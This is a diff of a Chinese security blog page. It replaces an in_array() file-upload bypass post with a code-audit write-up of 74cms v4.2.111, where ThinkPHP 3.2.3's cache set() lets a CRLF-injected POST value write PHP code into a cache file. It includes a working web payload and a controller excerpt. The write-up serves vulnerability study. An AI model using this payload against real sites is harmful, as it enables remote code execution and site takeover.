@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="代码审计," />
+  <meta name="keywords" content="CMS," />
 
 
 
@@ -79,21 +79,28 @@
 
 
 
-<meta name="description" content="最近看红日公众号的文章,看到 PHP-Audit-Labs 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波   Day 1 - Wish List题目名字:愿望清单代码大意:检查文件名file[‘name’]是否在白名单$whitelist里–&amp;gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIR">
-<meta name="keywords" content="代码审计">
+<meta name="description" content="前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。   审计cms：74cms_v4.2.111漏洞原理:用了Thinkphp3.2.3改写的缓存函数set()方法,而这个方法对写入的内容只进行了serialize()函数过滤操作,导致可用%0D%0A进行换行写入php代码而getshell">
+<meta name="keywords" content="CMS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计之Day1 - in_array函数缺陷">
-<meta property="og:url" content="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/index.html">
+<meta property="og:title" content="代码审计 | 74CMS缓存设计缺陷导致getshell">
+<meta property="og:url" content="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="最近看红日公众号的文章,看到 PHP-Audit-Labs 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波   Day 1 - Wish List题目名字:愿望清单代码大意:检查文件名file[‘name’]是否在白名单$whitelist里–&amp;gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIR">
+<meta property="og:description" content="前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。   审计cms：74cms_v4.2.111漏洞原理:用了Thinkphp3.2.3改写的缓存函数set()方法,而这个方法对写入的内容只进行了serialize()函数过滤操作,导致可用%0D%0A进行换行写入php代码而getshell">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/pquwjj86ytjbyba2dkr0ppvv/image_1cmmo17sncmevnor4a10hp1rm73d.png">
-<meta property="og:updated_time" content="2018-09-07T05:31:29.287Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png">
+<meta property="og:updated_time" content="2018-10-02T15:37:47.299Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="代码审计之Day1 - in_array函数缺陷">
-<meta name="twitter:description" content="最近看红日公众号的文章,看到 PHP-Audit-Labs 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波   Day 1 - Wish List题目名字:愿望清单代码大意:检查文件名file[‘name’]是否在白名单$whitelist里–&amp;gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIR">
-<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png">
+<meta name="twitter:title" content="代码审计 | 74CMS缓存设计缺陷导致getshell">
+<meta name="twitter:description" content="前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。   审计cms：74cms_v4.2.111漏洞原理:用了Thinkphp3.2.3改写的缓存函数set()方法,而这个方法对写入的内容只进行了serialize()函数过滤操作,导致可用%0D%0A进行换行写入php代码而getshell">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png">
 
 
 
@@ -123,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/"/>
 
 
 
 
 
-  <title>代码审计之Day1 - in_array函数缺陷 | P0rZ9's blog</title>
+  <title>代码审计 | 74CMS缓存设计缺陷导致getshell | P0rZ9's blog</title>
   
 
 
@@ -240,7 +247,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -257,7 +264,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">代码审计之Day1 - in_array函数缺陷</h1>
+          <h1 class="post-title" itemprop="name headline">代码审计 | 74CMS缓存设计缺陷导致getshell</h1>
         
 
         <div class="post-meta">
@@ -269,8 +276,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-06T08:15:41+08:00">
-                2018-09-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-02T10:15:41+08:00">
+                2018-10-02
               </time>
             
 
@@ -313,18 +320,38 @@
 
       
         <blockquote>
-<p>最近看红日公众号的文章,看到 <strong>PHP-Audit-Labs</strong> 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波</p>
+<p>前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。</p>
 </blockquote>
 <hr>
-<p><strong>Day 1 - Wish List</strong><br>题目名字:愿望清单<br><img src="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png" alt="image_1cmmmhtm01cn4nastlume1tso20.png-148.8kB"><br><strong>代码大意</strong>:检查文件名file[‘name’]是否在白名单$whitelist里–&gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIRECTORY</p>
-<p><strong>漏洞产生</strong>:这里考察的是任意文件上传漏洞,导致这一漏洞产生的原因是弱类型比较和in_array()的不规范使用,攻击者可通过构造的文件名(1.php)来绕过服务端的检测,造成文件上传漏洞<br><strong>漏洞解析</strong>:因为未将in_array()函数的第三个参数设置为TRUE且目标数组$whitelist的元素类型为数字类型,所以在进行in_array()判断时1.php会强制转化为1,而1在rand(1,24)数组中,最终绕过in_array()判断。</p>
-<blockquote>
-<p><strong>in_array()</strong><br>作用:检查数组中是否存在某个值<br>定义:bool in_array ( mixed \$needle , array \$haystack [, bool \$strict = FALSE ] )</p>
-</blockquote>
-<blockquote>
-<p>在\$haystack数组中搜索\$needle,如果\$strict参数的值为True,则in_array()函数会进行强检查(检查值、类型是否相同),如果没有设置,则默认为FALSE 进行弱检查(只检查值是否相同)。如果成功搜索到\$needle,则返回TRUE 否则返回FALSE。</p>
-</blockquote>
-<p><strong>本地测试:</strong><br><img src="http://static.zybuluo.com/chhyx/pquwjj86ytjbyba2dkr0ppvv/image_1cmmo17sncmevnor4a10hp1rm73d.png" alt="image_1cmmo17sncmevnor4a10hp1rm73d.png-35.3kB"></p>
+<p>审计cms：<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:用了<code>Thinkphp3.2.3</code>改写的缓存函数<code>set()</code>方法,而这个方法对写入的内容只进行了<code>serialize()</code>函数过滤操作,导致可用<code>%0D%0A</code>进行换行写入<code>php</code>代码而<code>getshell</code></p>
+<p>##<strong>1.基础知识:</strong><br><code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png" alt="image.png-73.6kB"></p>
+<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
+<p>##<strong>2.环境搭建:</strong><br>创建一个企业用户用于验证漏洞即可</p>
+<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
+<pre><code>url:http://127.0.0.1:84/index.php?m=&amp;c=Company&amp;a=com_auth
+POST:anew=1&amp;certificate_img_up=%2F%2F%0D%0Aphpinfo();//
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
+<p>##<strong>4.代码分析:</strong><br>相关变量已写入注释中：</p>
+<pre><code>#home\controller\companyController.class.php
+public function com_auth(){
+    ...
+    if(IS_POST &amp;&amp; $this-&gt;company_profile[&apos;audit&apos;]!=1){
+        $data[&apos;certificate_img&apos;] = I(&apos;post.certificate_img_up&apos;,&apos;&apos;,&apos;trim,badword&apos;);
+        $data[&apos;audit&apos;] = 2;
+    ...
+    if($this-&gt;company_profile[&apos;audit&apos;] == 0 || ($this-&gt;company_profile[&apos;audit&apos;] != 1 &amp;&amp; I(&apos;request.anew&apos;,0,&apos;intval&apos;) == 1)){
+        S(&apos;certificate_img_&apos; . $this-&gt;company_profile[&apos;uid&apos;],$this-&gt;company_profile[&apos;certificate_img&apos;]);
+    }
+    ...
+}
+</code></pre><p>这里在造成漏洞的原理是底层的tp框架的锅, 笔者前几天写过分析文章:<br><a href="https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/</a><br>我们这里再照常分析一遍代码流程:<br>跟进<code>TP</code>框架自带的<code>S()</code>缓存方法:<br><img src="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png" alt="image_1coqjmno01prl1qtah9718cn4im9.png-100.5kB"></p>
+<p>跟进<code>set()</code>方法:</p>
+<pre><code>Librayr\Think\Cache\Driver\File.class.php 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png" alt="image_1coqk0d8k19e511civine11hngm.png-95.1kB"></p>
+<p>跟进<code>filename()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png" alt="image_1coqk5e7ro91oa92l11l991k4913.png-69.4kB"></p>
+<p><code>uid</code>为2得到的缓存文件名:<br><img src="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png" alt="image_1coqknv8vc5c6kf146l1hq11khj1g.png-29.8kB"></p>
+<p>因为这里的<code>$filename</code>与<code>$name</code>相关联,而<code>$name</code>与<code>$uid</code>相关联<br>就是说我们可以根据用户的<code>uid</code>来得到缓存文件名 进而可<code>getshell</code><br><img src="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png" alt="image_1coql21hfvtdeae5l418hs9021t.png-151.8kB"><br><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
+<p><code>uid</code>可在个人主页看到:<br><img src="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png" alt="image_1coqmpc8hsc515brgk313ra1ben2n.png-86.2kB"></p>
 
       
     </div>
@@ -342,7 +369,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/CMS/" rel="tag"># CMS</a>
           
         </div>
       
@@ -355,8 +382,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/05/用hexo+girhub部署博客/" rel="next" title="用hexo+github部署博客">
-                <i class="fa fa-chevron-left"></i> 用hexo+github部署博客
+              <a href="/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/" rel="next" title="代码审计 | Thinkphp3.2 find_delete_selete注入分析">
+                <i class="fa fa-chevron-left"></i> 代码审计 | Thinkphp3.2 find_delete_selete注入分析
               </a>
             
           </div>
@@ -364,10 +391,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/06/代码审计之Day2 - filter_var函数缺陷/" rel="prev" title="代码审计之Day2 - filter_var函数缺陷">
-                代码审计之Day2 - filter_var函数缺陷 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
